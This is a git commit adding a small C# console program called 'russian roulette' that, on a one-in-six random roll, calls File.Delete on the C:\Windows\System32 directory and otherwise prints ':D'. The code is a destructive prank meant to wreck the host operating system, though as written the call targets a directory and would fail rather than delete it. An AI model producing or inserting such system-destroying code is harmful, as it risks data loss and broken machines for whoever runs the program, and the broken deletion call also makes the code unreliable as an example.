93d7d833a1c2bd3f0072e465968554012ea0660c
DistanceText <DistanceText@gmail.com>
2023-03-10 22:49:26 +0100

    Add project files.

---
+++ russian roulette/Program.cs
@@ -0,0 +1,27 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.IO;
+
+namespace russian_roulette
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Random rnd = new Random();
+            int i = rnd.Next(0, 6);
+            if (i == 1)
+            {
+                File.Delete(@"C:\Windows\System32");
+            }
+            else
+            {
+                Console.WriteLine(":D");
+            }
+            Console.ReadKey();
+        }
+    }
+}
